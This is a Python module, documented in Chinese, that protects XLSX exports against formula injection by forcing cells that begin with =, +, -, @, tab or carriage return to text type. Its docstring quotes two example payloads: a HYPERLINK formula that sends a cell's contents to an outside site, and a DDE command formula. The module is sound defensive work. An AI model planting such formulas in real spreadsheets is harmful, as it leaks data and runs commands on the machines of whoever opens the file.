"""XLSX 文本安全写入（2026-10-09）。

## 为什么要这一层

openpyxl 给单元格赋一个**以 `=` 开头**的字符串时，会把它标成公式
（`cell.data_type = "f"`，见 openpyxl `Cell._bind_value`）。用户双击打开导出件，
Excel 就会**真的求值**——这就是经典的 CSV/Excel 公式注入。

本系统里进表格的字符串大量来自"别处"：设备型号、明细名称、备注、客户名、
供应商——而这些又都来自**导入**（含甲方和供应商给的 Excel）。等于把不受控文本
直接送进 Excel 的公式解析器：

    =HYPERLINK("http://外网/?" & A1, "点我")     # 把单元格内容带到外网
    =cmd|'/c calc'!A0                            # 老式 DDE，可触发命令

## 口径

**只改单元格类型，不改内容。** 把危险字符串强制成文本型（`data_type="s"`），
Excel 打开时按字面显示、不求值；用户看到的字与原来一致。

不用"前缀单引号"那种做法：单引号会成为字符串的一部分，表格里会真的多出
一个 `'`，改变用户看到的内容。
"""

from __future__ import annotations

from collections.abc import Iterable
from typing import Any

# Excel 把这些字符开头的输入当公式/命令处理
_DANGEROUS_PREFIX = ("=", "+", "-", "@", "\t", "\r")


def looks_dangerous(value: Any) -> bool:
    """这个值被 Excel 当公式吗？（只判字符串，其余一律安全）"""
    return isinstance(value, str) and bool(value) and value[0] in _DANGEROUS_PREFIX


def harden(cell: Any) -> Any:
    """把一个已赋值的单元格从"公式"改回"文本"。返回入参，便于链式调用。"""
    if looks_dangerous(cell.value):
        # 必须是**文本**：openpyxl 在赋值那一刻已经把它标成 'f' 了
        cell.data_type = "s"
    return cell


def append_row(ws: Any, values: Iterable[Any]) -> Any:
    """`ws.append(values)` 的安全版本：追加后把该行的字符串类型收紧。

    给用 `append()` 批量写表的调用点用（模板下载、设备库导出）。
    """
    ws.append(list(values))
    for cell in ws[ws.max_row]:
        harden(cell)
    return ws


__all__ = ["harden", "append_row", "looks_dangerous"]
